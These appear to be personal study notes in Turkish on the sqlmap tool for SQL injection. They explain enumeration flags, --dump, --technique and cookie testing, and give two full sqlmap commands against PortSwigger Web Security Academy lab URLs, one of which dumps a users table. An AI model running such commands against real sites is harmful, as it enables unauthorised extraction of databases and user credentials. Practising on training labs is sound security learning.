

    -D DB               DBMS database to enumerate
    -T TBL              DBMS database table(s) to enumerate
    -C COL              DBMS database table column(s) to enumerate

bu şekilde hangi şeyi enumerate etmek istediğine karar verebilirsin 

--dump kullanarak belirtilen tablonun sütunun hepsini getirmesini sağlayabilirsin 
--tecnique ile hangi tekniği kullanacağını belirle  'DEUSTQ'
-D database ismini belirt
-T table ismini belirtmiş
```bash
python sqlmap.py -u "https://0a4300e404ee84788730f4f600c70072.web-security-academy.net/filter?category=Gifts" --technique=U -D public -T users_ybkirg  --dump -v 3
```


### Cookie kullanmak

--level >= 2 olması gerekir cookielerin denenmesi için 
--cookie ile cookieleri belirtebilirsin
```bash
python sqlmap.py -u "https://0a2d003a03431aac84a428cc00540064.web-security-academy.net" --cookie "TrackingId=asdasd" --dbs --level 2
```



[[TOOLs]]
[[SQLİ]]